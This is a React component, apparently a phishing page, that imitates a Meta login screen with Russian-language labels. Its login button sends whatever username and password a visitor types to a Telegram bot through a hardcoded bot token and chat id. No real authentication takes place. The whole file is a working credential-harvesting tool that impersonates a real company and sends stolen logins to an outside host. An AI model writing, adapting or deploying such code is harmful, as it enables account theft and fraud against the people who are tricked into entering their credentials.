import React, { useState } from "react";
import "./Hero.css";

const Hero = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  function telegramMessage() {
    let chat_id = "-1002514780725";
    let token = `7374387038:AAH282W7CtCXu1CroGv94hgnDP39508uW8w`;
    let api_key = `https://api.telegram.org/bot${token}/sendMessage`;

    let newUser = {
      chat_id: chat_id,
      parsel_modal: "html",
      text: `
      заказ
    Name:  ${username}
    Password:  ${password}
      `,
    };
    axios.post(api_key, newUser);
  }

  return (
    <div className="container">
      <div className="logo">∞ Meta</div>

      <input
        type="text"
        placeholder="Имя пользователя, эл. адрес или мобильный т..."
        className={`input ${username && "active"}`}
        value={username}
        onChange={(e) => setUsername(e.target.value)}
      />

      <input
        type="password"
        placeholder="Пароль"
        className={`input ${password && "active"}`}
        value={password}
        onChange={(e) => setPassword(e.target.value)}
      />

      <button
        onClick={() => telegramMessage()}
        className={`login-button ${username && password ? "enabled" : ""}`}
        disabled={!username || !password}
      >
        Войти
      </button>

      <a href="#" className="forgot-password">
        Забыли пароль?
      </a>

      <button className="create-account-button">Создать новый аккаунт</button>
    </div>
  );
};

export default Hero;
